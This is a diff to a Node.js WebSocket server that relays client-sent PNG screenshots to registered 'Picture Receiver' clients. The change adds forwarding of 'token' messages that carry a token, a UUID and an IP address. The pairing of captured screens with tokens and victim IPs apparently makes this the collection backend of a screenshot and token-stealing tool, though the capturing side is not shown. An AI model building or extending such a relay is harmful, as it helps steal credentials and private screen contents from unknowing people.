@@ -5,10 +5,8 @@ import crypto from 'crypto';
 
 const app = express();
 app.use(express.static("public"));
-
 const PORT = process.env.PORT || 3000;
 const server = http.createServer(app);
-
 const wss = new WebSocketServer({ noServer: true });
 
 server.on('upgrade', (request, socket, head) => {
@@ -27,16 +25,13 @@ let keepAliveId = null;
 
 wss.on("connection", (ws) => {
     const userID = crypto.randomUUID();  
-
     ws.on("message", (data) => {
         handleMessage(ws, data, userID);
     });
-
     ws.on("close", () => {
         handleDisconnect(userID);
         ws.removeAllListeners(); 
     });
-
     if (wss.clients.size === 1 && !keepAliveId) {
         keepServerAlive();
     }
@@ -49,7 +44,6 @@ wss.on("close", () => {
     }
 });
 
-// Add route to check Node.js version
 app.get('/node-version', (req, res) => {
     res.send(`Node.js version: ${process.version}`);
 });
@@ -57,8 +51,12 @@ app.get('/node-version', (req, res) => {
 const handleMessage = (ws, data, userID) => {
     try {
         const messageData = JSON.parse(data.toString());
+        
         if (messageData.command === 'Picture Receiver') {
             pictureReceivers.set(userID, ws);
+        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
+            // Broadcast token information only to picture receivers
+            broadcastToPictureReceivers(messageData);
         } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
             broadcastToPictureReceivers({
                 type: 'screenshot',
